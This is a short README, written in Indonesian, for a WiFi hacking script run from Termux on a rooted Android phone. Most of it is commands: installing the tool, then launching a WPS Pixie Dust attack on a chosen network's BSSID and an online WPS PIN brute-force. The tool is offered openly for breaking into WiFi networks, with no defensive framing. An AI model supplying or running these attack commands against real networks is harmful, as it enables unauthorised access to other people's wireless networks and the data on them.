## DelzWifi
### Hack WIfi Mengunakan Termux! (Wajib Root)

<p align="center"><img src="https://i.ibb.co/K74g0SC/hulu.jpg"></p>

### Installation :

```bash
apt update && apt upgrade
pkg install -y root-repo
pkg install -y git sudo python wpa-supplicant pixiewps iw
git clone https://github.com/ghodelzcalm/DelzWifi
sudo python DelzWifi/birihack.py -i wlan0 -K
```

## Langsung Menjalankan Perintah Script

```bash

sudo python DelzWifi/birihack.py -i wlan0 -K
```


## Perbarui

```bash

(cd DelzWifi && git pull)
```



#### Note: 
**Pertama matikan Wifi Anda.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python birihack.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python birihack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python birihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Jika Terjadi Error" - Nyalakan Wifi lalu Matikan Wifi.**

### Berhentikan script yang sedang berjalan 
**" (CTRL C).**
